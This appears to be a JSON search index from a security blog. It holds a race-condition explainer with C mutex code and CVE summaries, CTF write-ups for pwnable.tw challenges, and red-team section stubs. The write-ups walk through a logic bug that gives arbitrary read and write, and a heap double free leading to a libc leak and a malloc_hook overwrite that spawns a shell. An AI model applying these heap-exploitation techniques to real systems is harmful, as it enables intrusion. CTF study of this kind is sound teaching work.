NULL; } The race condition occurs because two threads simultaneously access and update a shared bank account balance without synchronization. In this example, the deposit thread reads the balance as 1000 and calculates a new balance of 1500 after adding 500. Meanwhile, the withdrawal thread also reads the balance as 1000 and calculates a new balance of 700 after subtracting 300. Since both threads perform their operations based on the initial balance of 1000, the withdrawal thread overwrites the deposit result. This leads to an incorrect final balance of 700 instead of the expected 1200, demonstrating how concurrent access to shared data can cause inconsistent results.\nThe root cause of the issue is that both threads read outdated values of the shared balance variable before any updates occur. As a result, each thread performs calculations using incorrect data and then writes its result, overwriting the other thread\u0026rsquo;s update.\nFor example:\nThe deposit thread reads the balance as 1000. The withdrawal thread also reads the balance as 1000, before the deposit thread has updated it. The deposit thread calculates the new balance as 1500 (by adding 500) and updates the balance. The withdrawal thread calculates the new balance as 700 (by subtracting 300) and overwrites the deposit thread‚Äôs result. In this code, the shared variable balance is accessed and modified by both threads without synchronization, causing a race condition. When I run this code, the final balance may be incorrect due to simultaneous operations, as the withdrawal thread can overwrite the deposit thread‚Äôs update.\nOne output sample Solution # To fix the race condition in the bank account example, we use mutexes to synchronize access to the shared balance variable. This ensures that only one thread at a time can read or update the balance, preventing inconsistent results caused by simultaneous operations. By locking the critical section where the balance is accessed, the program\u0026rsquo;s behavior becomes predictable and correct.\nKey Changes # Mutex Locking: We use pthread_mutex_lock before reading or modifying the balance variable to ensure mutual exclusion, preventing both the deposit and withdrawal threads from accessing the variable at the same time. Mutex Unlocking: After a thread completes its operation on the balance variable, it releases the lock using pthread_mutex_unlock, allowing the other thread to safely access the shared resource. Critical Section: The balance update logic is enclosed within the locked section to ensure that all read-modify-write operations are atomic and cannot be interrupted by another thread. pthread_mutex_t lock; int balance = 1000; int depositAmount = 500; int withdrawAmount = 300; void *deposit(void *arg) { int amount = *(int *)arg; pthread_mutex_lock(\u0026amp;lock); int temp = balance; usleep(1); balance = temp + amount; printf(\u0026#34;Deposit: +%d, New Balance: %d\\n\u0026#34;, amount, balance); pthread_mutex_unlock(\u0026amp;lock); return NULL; } void *withdraw(void *arg) { int amount = *(int *)arg; pthread_mutex_lock(\u0026amp;lock); if (balance \u0026gt;= amount) { int temp = balance; usleep(1); balance = temp - amount; printf(\u0026#34;Withdraw: -%d, New Balance: %d\\n\u0026#34;, amount, balance); } else { printf(\u0026#34;Withdraw: -%d, Insufficient funds! Current Balance: %d\\n\u0026#34;, amount, balance); } pthread_mutex_unlock(\u0026amp;lock); return NULL; } code Race Conditions in Operating Systems # Race conditions in operating systems occur when multiple processes or threads compete to access shared resources without proper synchronization. These issues can lead to unexpected behaviors, system crashes, data corruption, and security vulnerabilities. Understanding race conditions is critical for operating system developers, cybersecurity professionals, and CTF participants who explore kernel-level challenges.\nCommon Scenarios # File Access: Multiple processes accessing the same file simultaneously. Resource Allocation: Competing processes attempting to acquire system resources (e.g., memory, I/O devices). Inter-process Communication (IPC): Race conditions in pipes, message queues, or shared memory. Real-World # Race conditions can have severe consequences, affecting system stability, security, and functionality. Here are some notable real-world examples:\nData Corruption: A race condition in a database system could corrupt critical data, leading to incorrect application behavior. System Crashes: Operating systems can crash if kernel-level race conditions corrupt essential structures. Security Breaches: Attackers can exploit race conditions to escalate privileges, bypass security checks, or inject malicious code. Notable CVEs Related to Race Conditions # Race conditions are a common source of vulnerabilities in operating systems. Here are some notable CVEs:\nCVE-2016-5195 (Dirty COW)\nDescription: A race condition in the Linux kernel\u0026rsquo;s memory subsystem allowed attackers to gain write access to read-only files, leading to privilege escalation. Impact: This vulnerability was widely exploited, affecting millions of Linux systems. Fix: The issue was patched by implementing proper synchronization in the kernel\u0026rsquo;s memory management. CVE-2021-3493\nDescription: A race condition in the overlay filesystem in the Linux kernel allowed attackers to gain root privileges. Impact: Exploited in the wild to gain unauthorized access. Fix: The patch involved fixing the synchronization issue in the filesystem. CVE-2014-4014\nDescription: A race condition in the handling of user credentials in FreeBSD allowed attackers to hijack sessions. Impact: This vulnerability compromised the confidentiality and integrity of user sessions. Fix: Proper locking mechanisms were introduced to address the race condition. \u0026hellip;\nRace conditions often appear in Capture the Flag (CTF) challenges, particularly in the pwnable category, where participants exploit kernel vulnerabilities to achieve privilege escalation.\nMitigation Techniques # Use Proper Synchronization Primitives:\nMutexes Semaphores Spinlocks Minimize Critical Sections:\nReduce the amount of code executed within critical sections to minimize contention. Implement Atomic Operations:\nUse atomic operations for shared resource access to ensure data consistency. Conclusion # Race conditions are a critical issue in multi-threaded and multi-process systems, where the timing or order of operations can lead to unpredictable results or security vulnerabilities. Preventing race conditions requires careful design and the use of appropriate synchronization techniques. Proper synchronization is crucial to maintaining data integrity and ensuring that multi-threaded or multi-process programs function as expected.\nFor further learning, it‚Äôs essential to study concurrency and synchronization mechanisms specific to your programming environment and continue exploring best practices to avoid race conditions in complex systems.\n","date":"3 January 2025","externalUrl":null,"permalink":"/notes/race-condition/","section":"Notes","summary":"Techniques for Exploiting Race Conditions","title":"Race Condition","type":"notes"},{"content":"","date":"3 January 2025","externalUrl":null,"permalink":"/tags/vulnerability-analysis/","section":"Tags","summary":"","title":"Vulnerability Analysis","type":"tags"},{"content":" calc # Let\u0026rsquo;s check # Check if the expression valid. There is nothing important in the above section; I will check the details in parse_expr.\nint __cdecl parse_expr(int input, _DWORD *arr) { int v3; // eax int v4; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v6; // [esp+28h] [ebp-80h] int lenNum; // [esp+2Ch] [ebp-7Ch] char *num; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] _BYTE expression[100]; // [esp+38h] [ebp-70h] BYREF unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v4 = input; v6 = 0; bzero(expression, 0x64u); // erases for ( i = 0; ; ++i ) { if ( *(char *)(i + input) - (unsigned int)\u0026#39;0\u0026#39; \u0026gt; 9 )// check in [+, -, *, /, %] or null byte \\(Ôø£Ô∏∂Ôø£*\\)) { lenNum = i + input - v4; num = (char *)malloc(lenNum + 1); memcpy(num, v4, lenNum); num[lenNum] = 0; if ( !strcmp(num, \u0026#34;0\u0026#34;) ) { puts(\u0026#34;prevent division by zero\u0026#34;); fflush(stdout); return 0; } v9 = atoi(num); if ( v9 \u0026gt; 0 ) { v3 = (*arr)++; arr[v3 + 1] = v9; } if ( *(_BYTE *)(i + input) \u0026amp;\u0026amp; *(char *)(i + 1 + input) - (unsigned int)\u0026#39;0\u0026#39; \u0026gt; 9 )// // check if current index is not null and next index is not the num // if current index is null, continue { puts(\u0026#34;expression error!\u0026#34;); fflush(stdout); return 0; } v4 = i + 1 + input; // next num if ( expression[v6] ) { switch ( *(_BYTE *)(i + input) ) { case \u0026#39;%\u0026#39;: case \u0026#39;*\u0026#39;: case \u0026#39;/\u0026#39;: if ( expression[v6] != \u0026#39;+\u0026#39; \u0026amp;\u0026amp; expression[v6] != \u0026#39;-\u0026#39; )// check in [%, *, /] -\u0026gt; calculate immediately goto LABEL_14; expression[++v6] = *(_BYTE *)(i + input); break; case \u0026#39;+\u0026#39;: case \u0026#39;-\u0026#39;: LABEL_14: eval(arr, expression[v6]); // calculate the right first and replace with new sign expression[v6] = *(_BYTE *)(i + input); break; default: // it checks byte \u0026#34;\\n\u0026#34; ~ mean end of input eval(arr, expression[v6--]); // calculate the right first and remove this sign break; } } else { expression[v6] = *(_BYTE *)(i + input); } if ( !*(_BYTE *)(i + input) ) break; } } while ( v6 \u0026gt;= 0 ) eval(arr, expression[v6--]); return 1; } I comment in detail in some important code, so I just summarize the main note.\nThis function checks each char in input until this char is in [+, -, *, /, %] or a null byte. Why NULL byte??¬†The reason for this is that - (unsigned int)'0' If matched, it calls malloc and atoi to convert to a number. Especially, this saves the number of num to *arr and each num after this,arr while arr is v1[101] in the calc function. I imagine that v1[0] saves the number of num, and v1[1], v1[2],\u0026hellip;. save each number after. In the first expression, this function doesn\u0026rsquo;t call anything; it just saves the first size to expression[].\nThe next work is the same as the above-mentioned steps, but now this will calculate\nif ( expression[v6] ) { switch ( *(_BYTE *)(i + input) ) { case \u0026#39;%\u0026#39;: case \u0026#39;*\u0026#39;: case \u0026#39;/\u0026#39;: if ( expression[v6] != \u0026#39;+\u0026#39; \u0026amp;\u0026amp; expression[v6] != \u0026#39;-\u0026#39; )// check in [%, *, /] -\u0026gt; calculate immediately goto LABEL_14; expression[++v6] = *(_BYTE *)(i + input); break; case \u0026#39;+\u0026#39;: case \u0026#39;-\u0026#39;: LABEL_14: eval(arr, expression[v6]); // calculate the right first and replace with new sign expression[v6] = *(_BYTE *)(i + input); break; default: // it checks byte \u0026#34;\\n\u0026#34; ~ mean end of input eval(arr, expression[v6--]); // calculate the right first and remove this sign break; } } eval only calculate two number a1[*a1 - 1] and a1[*a1] and give the result in the first number. After that, this will decrease *a1 ~ the number of num to get the index of the result and calculate later expression.\nThis rule is that calculate [*, /, %] before [+, -]. This section implement by locating the sign with higher role in the right of expression. If sign in [*, /, %], and the previous also in this, this will calculate the previous first because of the same role. Meanwhile, if sign in [*, /, %] and the previous in [+, -], this only add this sign to the right of expression. If sign in [+, -], it will calculate the right most of expression and replace the old sign. Example\n1+2*3+4 ‚Üí1 ‚Üí1+2*3 ‚Üí1+6+4\n1+2*3*4+5 ‚Üí1+2*3 ‚Üí1+6*4 ‚Üí1+24+5\n1*2+3+4*5 ‚Üí1*2 ‚Üí2+3 ‚Üí5+4*5\n1*2+3+4*5+6 ‚Üí1*2 ‚Üí2+3 ‚Üí5+4*5 ‚Üí5+20+6\nOnce done, this section will calculate from the right to the left of the expression; this would be right because the sign in the later expression is only in [+, -] or the sign with the higher role in the rightmost\nwhile ( v6 \u0026gt;= 0 ) eval(arr, expression[v6--]); Exploitation # Hmm, do I miss something?\nI just think that this should only handle (check in loop) with sign instead of both sign and number.\nIf it gets two numbers in v1 to calculate, is it possible to input only one number and trigger something?\nIs this use of v1[0] as a count and taking it as the index to calculate while num is just in the next location secure?\nIf I don\u0026rsquo;t input any number before signing in the first expression.\nif ( sign == \u0026#39;+\u0026#39; ) { a1[*a1 - 1] += a1[*a1]; } if ( parse_expr(input, v1) ) // calculate expression { printf(\u0026#34;%d\\n\u0026#34;, v1[v1[0]]); fflush(stdout); } AAR # -5333956 ~ 0xffae9c3c\ncount = 1\n‚Üí a1[count - 1] += a1[count] (a1[0] ~ count ; a1[1] = 400)\n‚Üí a1[0] = 1 + a1[1] = 1 + 400 = 401\n‚Üí count = 401\nAAW # count = 1\n‚Üí a1[count - 1] += a1[count] (a1[0] ~ count ; a1[1] = 400)\n‚Üí a1[0] = 1 + a1[1] = 1 + 400 = 401\n‚Üí count = 401\n‚Üí a1[count - 1] += a1[count] (a1[0] ~ count ; a1[1] = 400)\n‚Üí a1[400] += a1[401]\na1[401] = 1, the reason for this is that\nif ( v9 \u0026gt; 0 ) { v3 = (*arr)++; arr[v3 + 1] = v9; } Note # The other sign has the same logic bug, so I just use it to leak, write the payload, and execute this.\nPayload # solve.py Secrect Garden # Let\u0026rsquo;s check # raise # int raise() { _QWORD *v0; // rbx void *v1; // rbp _QWORD *v2; // rcx unsigned int v3; // edx _DWORD size[9]; // [rsp+4h] [rbp-24h] BYREF *(_QWORD *)\u0026amp;size[1] = __readfsqword(0x28u); size[0] = 0; if ( count_flower \u0026gt; 0x63u ) return puts(\u0026#34;The garden is overflow\u0026#34;); v0 = malloc(0x28uLL); *v0 = 0LL; v0[1] = 0LL; // name v0[2] = 0LL; // color v0[3] = 0LL; v0[4] = 0LL; __printf_chk(1LL, \u0026#34;Length of the name :\u0026#34;); if ( (unsigned int)__isoc99_scanf(\u0026#34;%u\u0026#34;, size) == -1 ) exit(-1); v1 = malloc(size[0]); if ( !v1 ) { puts(\u0026#34;Alloca error !!\u0026#34;); exit(-1); } __printf_chk(1LL, \u0026#34;The name of flower :\u0026#34;); read(0, v1, size[0]); v0[1] = v1; __printf_chk(1LL, \u0026#34;The color of the flower :\u0026#34;); __isoc99_scanf(\u0026#34;%23s\u0026#34;, v0 + 2); *(_DWORD *)v0 = 1; // mark it grow if ( garden[0] ) { v2 = \u0026amp;garden[1]; v3 = 1; while ( *v2 ) { ++v3; ++v2; if ( v3 == 100 ) goto Add; } } else { v3 = 0; } garden[v3] = v0; Add: ++count_flower; return puts(\u0026#34;Successful !\u0026#34;); } raise() use malloc to allocate for v0 with the size of 0x28, make sure all element in v0 is zero. Then, malloc to allocate for v1 with the size which I input, I will enter the name of flower with the respectively size. -\u0026gt; v0[1] = v1 -\u0026gt; v0[1] is the pointer to v1. Afterwards, raise() requires to input the color of the flower with the size: 23(make sure \u0026lt; 3 bytes), and store in v0[2], and -\u0026gt;*(_DWORD *)v0 = 1; Finally, it stores v0 to garden make sure the size of garden \u0026lt;= 100 I think about the struct like this\nstruct Flower{ int used; // set when raise successfully char *name_flower; // input the size and input the name char color_flower[24]; // nothing special, except for the input } Then, the program will store a pointer to this struct in garden.\nvisit # int visit() { __int64 v0; // rbx __int64 v1; // rax v0 = 0LL; if ( count_flower ) { do { v1 = garden[v0]; if ( v1 \u0026amp;\u0026amp; *(_DWORD *)v1 ) { __printf_chk(1LL, \u0026#34;Name of the flower[%u] :%s\\n\u0026#34;, v0, *(const char **)(v1 + 8)); LODWORD(v1) = __printf_chk(1LL, \u0026#34;Color of the flower[%u] :%s\\n\u0026#34;, v0, (const char *)(garden[v0] + 16LL)); } ++v0; } while ( v0 != 100 ); } else { LODWORD(v1) = puts(\u0026#34;No flower in the garden !\u0026#34;); } return v1; } It is simple to print all the flowers in the garden with the condition that v1 \u0026amp;\u0026amp; *(_DWORD *)v1, which also means v1 is the valid pointer (not null) and used in struct flower is set.\nremove # int remove() { _DWORD *v1; // rax unsigned int index; // [rsp+4h] [rbp-14h] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-10h] v3 = __readfsqword(0x28u); if ( !count_flower ) return puts(\u0026#34;No flower in the garden\u0026#34;); __printf_chk(1LL, \u0026#34;Which flower do you want to remove from the garden:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;index); if ( index \u0026lt;= 0x63 \u0026amp;\u0026amp; (v1 = (_DWORD *)garden[index]) != 0LL ) { *v1 = 0; // mark Flower = 0, but this function doesn\u0026#39;t check it free(*(void **)(garden[index] + 8LL)); // don\u0026#39;t free Flower, only free name of Flower return puts(\u0026#34;Successful\u0026#34;); } else { puts(\u0026#34;Invalid choice\u0026#34;); return 0; } } This function takes input(index) from user and check index \u0026lt;= 0x63 \u0026amp;\u0026amp; (v1 = (_DWORD *)garden[index]) != 0LL , then free this pointer to flower.\nclean # unsigned __int64 clean() { _QWORD *v0; // rbx _DWORD *v1; // rdi unsigned __int64 v3; // [rsp+8h] [rbp-20h] v3 = __readfsqword(0x28u); v0 = garden; do { v1 = (_DWORD *)*v0; if ( *v0 \u0026amp;\u0026amp; !*v1 ) { free(v1); // Also free Flower *v0 = 0LL; --count_flower; } ++v0; } while ( v0 != \u0026amp;garden[100] ); puts(\u0026#34;Done!\u0026#34;); return __readfsqword(0x28u) ^ v3; } Loop all flower in the garden(from 0 to 100), check condition: *v0 \u0026amp;\u0026amp; !*v1 exit # leave the program\nExploitation # if ( index \u0026lt;= 0x63 \u0026amp;\u0026amp; (v1 = (_DWORD *)garden[index]) != 0LL ) { *v1 = 0; // mark Flower = 0, but this function doesn\u0026#39;t check it free(*(void **)(garden[index] + 8LL)); // don\u0026#39;t free Flower, only free name of Flower return puts(\u0026#34;Successful\u0026#34;); } free: not set ptr to null and check used to 0. -\u0026gt; double free -\u0026gt; arbitrary write primitives\nAnd free THE CHUNK STORE THE NAME OF THE FLOWER, NOT THE FLOWER.\nLeak libc # Notice that: in the raise() function, the program will malloc 0x28 (the chunk will have a size of 0x30) and I have one more time to request malloc with the size I input(for name of the flower). Target: unsortedbin + remainder. Example\nI request 0x100 size for name (0x110 size for chunk) twice; the second is to ensure that the chunk will not consolidate with the top chunk. Then, free the first chunk Request 0xd8 size for name(0xe0 size for chunk) The reason: 0x30 + 0xe0 = 0x110 First, the unsorted will take 0x30 in unsortedbin to request for the struct flower, and the request for the name in the second (0xe0) will allocate for the remain chunk. Write the name with length 8 to leak the address of unsortedbin when call printf() The result # Before free I don\u0026rsquo;t know exactly what the chunk with size of 0x1011 is, but it is not important, so I will pass it. After request to trigger\nThe first request for the struct flower. Next, request for the name of the flower.\nThe next time I call visit(), it will leak the address of unsortedbin-\u0026gt;leaklibc.\nFastbin dup to trigger call system(\u0026quot;/bin/sh\u0026quot;): onegadget.\nFirst, I try to overwrite the malloc_hook with one gadet. Unless it fails, I will find other ways. Fortunately, it works.\nPayload # solve.py ","date":"1 January 2025","externalUrl":null,"permalink":"/ctf/pwnable.tw/","section":"CTF","summary":"\u003ch2 class=\"relative group\"\u003ecalc \n    \u003cdiv id=\"calc\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#calc\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\n\u003ch3 class=\"relative group\"\u003eLet\u0026rsquo;s check \n    \u003cdiv id=\"lets-check\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#lets-check\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003e\n\n\n\n\n\n\n\u003cfigure\u003e\n      \u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"images\"\n    srcset=\"\n      /ctf/pwnable.tw/img/calc/main_hu_7567b087439d179b.png  330w,\n      /ctf/pwnable.tw/img/calc/main_hu_9d1bc36a6fb8d199.png  660w,\n      /ctf/pwnable.tw/img/calc/main_hu_27ab9df07f59010b.png 1280w\n    \"\n    data-zoom-src=\"/ctf/pwnable.tw/img/calc/main.png\"\n    src=\"/ctf/pwnable.tw/img/calc/main.png\"\u003e\n\n  \n\u003c/figure\u003e\n\u003c/p\u003e","title":"pwnable.tw","type":"ctf"},{"content":" ","externalUrl":null,"permalink":"/tags/advanced/","section":"Tags","summary":"\u003c!-- This is the advanced tag. Just like other listing pages in Blowfish, you can add custom content to individual taxonomy terms and it will be displayed at the top of the term listing. :rocket:\n\nYou can also use these content pages to define Hugo metadata like titles and descriptions that will be used for SEO and other purposes. --\u003e","title":"Advanced","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":" You breathe when I allow it.\nEvery move, every signal ‚Äî mine to command. C2 Frameworks (Cobalt Strike, Empire, Sliver, Mythic, etc.)\nCustom Implants \u0026amp; Beacons\nCovert Channels (DNS, HTTP/S, ICMP, etc.)\n","externalUrl":null,"permalink":"/redteam/c2/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  You breathe when I allow it.\u003cbr\u003e\nEvery move, every signal ‚Äî mine to command.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eC2 Frameworks (Cobalt Strike, Empire, Sliver, Mythic, etc.)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCustom Implants \u0026amp; Beacons\u003c/p\u003e","title":"Command \u0026 Control (C2)","type":"redteam"},{"content":" Your credentials belong to me now.\nOne slip, and the keys to your kingdom are gone. Credential Dumping (Mimikatz, LSASS, SAM, NTDS.dit)\nBrute Force / Password Spraying\nPass-the-Hash / Pass-the-Ticket\n","externalUrl":null,"permalink":"/redteam/credentialaccess/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Your credentials belong to me now.\u003cbr\u003e\nOne slip, and the keys to your kingdom are gone.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCredential Dumping (Mimikatz, LSASS, SAM, NTDS.dit)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBrute Force / Password Spraying\u003c/p\u003e","title":"Credential Access","type":"redteam"},{"content":" Your secrets stolen.\nYour truth rewritten.\nYour empire in ashes. Data Exfiltration\nData Manipulation\nRansomware / Wipers / Destructive Actions\n","externalUrl":null,"permalink":"/redteam/dataimpact/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Your secrets stolen.\u003cbr\u003e\nYour truth rewritten.\u003cbr\u003e\nYour empire in ashes.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eData Exfiltration\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eData Manipulation\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRansomware / Wipers / Destructive Actions\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"Data \u0026 Impact","type":"redteam"},{"content":" Move in the shadows, leave no trace. Hidden like a ninja, blended like a ghost. Defense Evasion (obfuscation, AV/EDR bypass, AMSI bypass)\nAnti-Forensics\nRed Team Tradecraft (staging, clean-up, false flags)\n","externalUrl":null,"permalink":"/redteam/evasionopsec/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Move in the shadows, leave no trace. Hidden like a ninja, blended like a ghost.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eDefense Evasion (obfuscation, AV/EDR bypass, AMSI bypass)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAnti-Forensics\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRed Team Tradecraft (staging, clean-up, false flags)\u003c/p\u003e","title":"Evasion \u0026 OPSEC","type":"redteam"},{"content":" Pull the trigger.\nPayloads unleashed, systems bent to your will. Malware \u0026amp; Payload Delivery\nExploit Execution\nLiving off the Land (LOLBins)\n","externalUrl":null,"permalink":"/redteam/execution/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Pull the trigger.\u003cbr\u003e\nPayloads unleashed, systems bent to your will.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eMalware \u0026amp; Payload Delivery\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExploit Execution\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLiving off the Land (LOLBins)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"Execution","type":"redteam"},{"content":"This is a placeholder for basic and frequently used tricks in cybersecurity and IT.\nYou can add shell tricks, CLI shortcuts, or simple bug-hunting techniques here.\n","externalUrl":null,"permalink":"/tricks/fundamental/","section":"Tricks","summary":"\u003cp\u003eThis is a placeholder for basic and frequently used tricks in cybersecurity and IT.\u003c/p\u003e\n\u003cp\u003eYou can add shell tricks, CLI shortcuts, or simple bug-hunting techniques here.\u003c/p\u003e","title":"Fundamental Tricks","type":"tricks"},{"content":"This is a placeholder for the Notes Highlights page.\nUse this to feature interesting or frequently referenced content.\n","externalUrl":null,"permalink":"/notes/highlights/","section":"Notes","summary":"\u003cp\u003eThis is a placeholder for the Notes Highlights page.\u003c/p\u003e\n\u003cp\u003eUse this to feature interesting or frequently referenced content.\u003c/p\u003e","title":"Highlights","type":"notes"},{"content":" One falls, the rest will follow.\nCompromise spreads like fire through the network. Remote Services (RDP, SMB, WMI, WinRM, SSH)\nExploiting Trusts\nPivoting \u0026amp; Tunneling\n","externalUrl":null,"permalink":"/redteam/lateralmovement/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  One falls, the rest will follow.\u003cbr\u003e\nCompromise spreads like fire through the network.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eRemote Services (RDP, SMB, WMI, WinRM, SSH)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExploiting Trusts\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePivoting \u0026amp; Tunneling\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"Lateral Movement","type":"redteam"},{"content":" Write-ups for OSCP labs, war games, bug bounty reports,\u0026hellip;\u0026hellip; A place for real-world or uncategorized technical adventures.\n","externalUrl":null,"permalink":"/others/","section":"Other","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Write-ups for OSCP labs, war games, bug bounty reports,\u0026hellip;\u0026hellip;\n\u003c/div\u003e\n\n\u003cp\u003eA place for real-world or uncategorized technical adventures.\u003c/p\u003e","title":"Other","type":"others"},{"content":"This is a placeholder for the Notes Overview page.\nFeel free to add content summarizing the key areas you\u0026rsquo;re documenting here.\n","externalUrl":null,"permalink":"/notes/overview/","section":"Notes","summary":"\u003cp\u003eThis is a placeholder for the Notes Overview page.\u003c/p\u003e\n\u003cp\u003eFeel free to add content summarizing the key areas you\u0026rsquo;re documenting here.\u003c/p\u003e","title":"Overview","type":"notes"},{"content":" I was a guest.\nNow I‚Äôm the ruler.\nYour crown is mine. Local Privilege Escalation\nKernel / Driver Exploits\nCredential Abuse (tokens, impersonation, etc.)\n","externalUrl":null,"permalink":"/redteam/priviledgeescalation/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  I was a guest.\u003cbr\u003e\nNow I‚Äôm the ruler.\u003cbr\u003e\nYour crown is mine.\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLocal Privilege Escalation\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKernel / Driver Exploits\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCredential Abuse (tokens, impersonation, etc.)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"Privilege Escalation","type":"redteam"},{"content":"This is a placeholder for practical and real-world techniques, such as CTF solutions, penetration testing notes, or reverse engineering methods.\n","externalUrl":null,"permalink":"/tricks/practical/","section":"Tricks","summary":"\u003cp\u003eThis is a placeholder for practical and real-world techniques, such as CTF solutions, penetration testing notes, or reverse engineering methods.\u003c/p\u003e","title":"Real-World Cases","type":"tricks"},{"content":" \u0026ldquo;Know your enemy and know yourself, and you will win a hundred battles without disaster.\u0026rdquo; - The Art of War Recon (OSINT, footprinting, enumeration)\nScanning \u0026amp; Enumeration (network, services, users)\nSocial Engineering (phishing, vishing, smishing, pretexting)\n","externalUrl":null,"permalink":"/redteam/recondiscovery/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  \u0026ldquo;Know your enemy and know yourself, and you will win a hundred battles without disaster.\u0026rdquo; - The Art of War\n\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eRecon (OSINT, footprinting, enumeration)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eScanning \u0026amp; Enumeration (network, services, users)\u003c/p\u003e","title":"Reconnaissance \u0026 Discovery","type":"redteam"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":" Quick and useful tricks for cybersecurity, systems, and development. This section contains practical tricks, real-world shortcuts, and hands-on techniques in cybersecurity, Linux, networking, reverse engineering, and more.\nStart with Fundamental Tricks or jump into Real-World Cases .\n","externalUrl":null,"permalink":"/tricks/","section":"Tricks","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Quick and useful tricks for cybersecurity, systems, and development.\n\u003c/div\u003e\n\n\u003cp\u003eThis section contains practical tricks, real-world shortcuts, and hands-on techniques in cybersecurity, Linux, networking, reverse engineering, and more.\u003c/p\u003e","title":"Tricks","type":"tricks"}]